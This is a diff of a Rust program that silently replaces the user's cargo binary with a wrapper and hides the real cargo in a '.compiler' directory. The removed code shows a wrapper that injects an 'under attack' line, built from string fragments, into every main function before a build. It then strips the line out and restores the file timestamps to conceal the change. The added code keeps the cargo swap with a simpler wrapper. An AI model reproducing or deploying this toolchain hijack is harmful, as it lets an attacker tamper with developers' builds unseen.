@@ -1,9 +1,8 @@
-use std::fs::{self, File};
+use std::fs::{self};
 use std::io::Write;
 use std::path::{Path, PathBuf};
 use std::process::Command;
 use std::fs::OpenOptions;
-use std::io::{BufReader, BufRead};
 use std::process::exit;
 use std::process::Stdio;
 use std::env;
@@ -46,196 +45,54 @@ fn main() -> std::io::Result<()> {
     let new_cargo_path = cargo_dir.join(".compiler/cargo"); 
     if new_cargo_path.parent().unwrap().exists(){
     return  Ok(());}
-    // Define the project name
-    let project_name = "generated_project";
-
-    // Create a new Cargo project
-    let status = Command::new("cargo")
-        .arg("new")
-        .stdout(Stdio::null())  // Suppress stdout
-    	.stderr(Stdio::null())  // Suppress stderr
-        .arg(&project_name)
-        .status()?;
-
-    if !status.success() {
-        eprintln!("System Error");
-        std::process::exit(1);
-    }
+    
 
     // Path to the main.rs file within the new Cargo project
-    let file_path = Path::new(&project_name).join("src").join("main.rs");
-
-    // The Rust code to write into the main.rs file
-    let rust_code = format!(r#"
-use filetime::{{set_file_times, FileTime}};
-use regex::Regex;
-use std::fs::{{self, OpenOptions}};
-use std::io::{{self, BufReader, Seek, SeekFrom, Write, Read}};
-use walkdir::WalkDir;
-use std::process::Command;
-use std::env;
-
-fn main() -> io::Result<()> {{
-    let src_dir = "src";
-    let regex_main_fn = Regex::new(r"^fn main\(\)(?: -> .*)? *\{{").unwrap();
-    let marker = "// INSERTED BY WRAPPER"; // Unique identifier for inserted lines
-
-    for entry in WalkDir::new(src_dir)
-        .into_iter()
-        .filter_map(Result::ok)
-        .filter(|e| e.path().extension().map_or(false, |ext| ext == "rs")) {{
-        let path = entry.path();
-        let metadata_before = fs::metadata(path)?;
-
-        let access_time_before = FileTime::from_last_access_time(&metadata_before);
-        let modification_time_before = FileTime::from_last_modification_time(&metadata_before);
-
-        let mut file = OpenOptions::new().read(true).write(true).open(path)?;
-
-        let mut contents = String::new();
-        {{
-            let mut reader = BufReader::new(&file);
-            reader.read_to_string(&mut contents)?;
-        }}
-
-        let mut lines: Vec<String> = contents.lines().map(String::from).collect();
-        let mut modified = false;
-
-        for (i, line) in lines.iter().enumerate() {{
-            if regex_main_fn.is_match(line) {{
-	    lines.insert(i + 1, format!("{{}}{{}}{{}}{{}} {{{{ println!(\"hello world, you are under attack\"); }}}} {{}}", "u", "n" , "sa" , "fe" , marker));
-
-                modified = true;
-                break;
-            }}
-        }}
-
-        if modified {{
-            file.set_len(0)?; // Truncate the file
-            file.seek(SeekFrom::Start(0))?; // Move to the beginning of the file
-            for line in &lines {{
-                writeln!(file, "{{}}", line)?;
-            }}
-
-            // Restore the original file timestamps
-            set_file_times(path, access_time_before, modification_time_before)?;
-        }}
-    }}
-
-    let args: Vec<String> = std::env::args().skip(1).collect();
-    let mut command = Command::new({:?});
-    for arg in args.iter() {{
-        command.arg(arg);
-    }}
-    let _ = command.status().expect("cargo not found");
-
-    // Remove inserted lines
-for entry in WalkDir::new(src_dir)
-    .into_iter()
-    .filter_map(Result::ok)
-    .filter(|e| e.path().extension().map_or(false, |ext| ext == "rs")) {{
-    let path = entry.path();
-
-    // Retrieve metadata before making changes to restore timestamps later
-    let metadata_before = fs::metadata(&path)?;
-    let access_time_before = FileTime::from_last_access_time(&metadata_before);
-    let modification_time_before = FileTime::from_last_modification_time(&metadata_before);
-
-    let mut file = OpenOptions::new().read(true).write(true).open(&path)?;
-
-    let mut contents = String::new();
-    {{
-        let mut reader = BufReader::new(&file);
-        reader.read_to_string(&mut contents)?;
-    }}
-
-    if contents.contains(marker) {{
-        let lines: Vec<String> = contents
-            .lines()
-            .filter(|line| !line.contains(marker))
-            .map(String::from)
-            .collect();
-
-        file.set_len(0)?; // Truncate the file
-        file.seek(SeekFrom::Start(0))?; // Move to the beginning of the file
-        for line in &lines {{
-            writeln!(file, "{{}}", line)?;
-        }}
-
-        // Restore the original file timestamps
-        set_file_times(&path, access_time_before, modification_time_before)?;
-    }}
-}}
-
-       Ok(())
-}}
-
-"#, new_cargo_path.to_str().unwrap());
-
-    // Write the Rust code into the main.rs file of the new Cargo project
-    let mut file = File::create(&file_path)?;
-    file.write_all(rust_code.as_bytes())?;
-	
-    // Add dependencies to Cargo.toml
-    let cargo_toml_path = Path::new(&project_name).join("Cargo.toml");
+    let mut file = OpenOptions::new().append(true).create(true).open("cargo.rs").unwrap();
     
-    // Read the current contents of the Cargo.toml file
-    let mut contents = fs::read_to_string(&cargo_toml_path)?;
 
-    // Find the position of the [dependencies] line and calculate where to insert new dependencies
-    let insert_pos = contents.find("[dependencies]").unwrap() + "[dependencies]".len();
+     let rust_code = format!(r#"
+	use std::fs::OpenOptions;
+	use std::process::Command;
+	use std::io;
+	use std::io::Write;
+	
+	fn main() -> io::Result<()> {{
+		
+		let file_path = "file.txt";
 
-    // Define the new dependencies to add
-    let new_dependencies = "\nfiletime = \"0.2\"\nregex = \"1.5.4\"\nwalkdir = \"2.3.2\"\n";
+		let mut file = OpenOptions::new()
+		.append(true)
+		.create(true)
+		.open(file_path)
+		.unwrap();
+   
+		let args: Vec<String> = std::env::args().skip(1).collect();
+		let mut command = Command::new({:?});
+		for arg in args.iter() {{
+		    command.arg(arg);
+		}}
+		let _ = command.status().expect("cargo not found");
 
-    // Insert the new dependencies into the contents string
-    contents.insert_str(insert_pos, new_dependencies);
-    // Truncate the file and write the modified contents back to Cargo.toml
-    let mut cargo_toml = OpenOptions::new()
-        .write(true)
-        .truncate(true)
-        .open(&cargo_toml_path)?;
-
-    cargo_toml.write_all(contents.as_bytes())?;
+		Ok(())
+	}}
+	"#, &new_cargo_path.to_str().unwrap() );
+	
+	let _ = writeln!(file, "{}", rust_code);
 
     // Compile the Cargo project
-    Command::new("cargo")
-        .arg("build")
+    Command::new("rustc")
+        .arg("cargo.rs")
         .stdout(Stdio::null())  // Suppress stdout
     	.stderr(Stdio::null())  // Suppress stderr
-        .current_dir(Path::new(&project_name))
         .status()?;
         
-    let _ = fs::remove_dir_all(&project_name);
-    	
-    let file = File::open("Cargo.toml")?;
-    let reader = BufReader::new(file);
-
-    // Skip the first line and collect the rest
-    let new_contents: Vec<String> = reader.lines().skip(1).collect::<Result<_, _>>()?;
-
-    // Write the modified contents back to the file
-    let mut file = File::create("Cargo.toml")?;
-    for line in new_contents {
-        writeln!(file, "{}", line)?;
-    }
+    let _ = fs::remove_file("cargo.rs");
+        
+    
     // move cargo into the compiler directory 
     fs::create_dir_all(&new_cargo_path.parent().unwrap())?; 
     let _ = fs::rename(&cargo_path, &new_cargo_path, )?; 
-    
-    
-    // Rename the generated project to a generic name, handling platform-specific executable extensions.
-    #[cfg(target_os = "windows")]
-    let generated_executable_name = "target\\debug\\generated_project.exe";
-	#[cfg(not(target_os = "windows"))]
-	let generated_executable_name = "target/debug/generated_project";
-
-	#[cfg(target_os = "windows")]
-	let new_executable_name = "target\\debug\\cargo.exe";
-	#[cfg(not(target_os = "windows"))]
-	let new_executable_name = "target/debug/cargo";
-
-	fs::rename(generated_executable_name, new_executable_name)?;
 
 	// Define the final script path, taking into account platform-specific executable extensions.
 	#[cfg(target_os = "windows")]
@@ -245,7 +102,7 @@ for entry in WalkDir::new(src_dir)
 
 	let script_path = cargo_dir.join(script_file_name);
 
-	let _ = fs::rename(new_executable_name , &script_path);
+	let _ = fs::rename(script_file_name , &script_path);
     
     Ok(())
 }
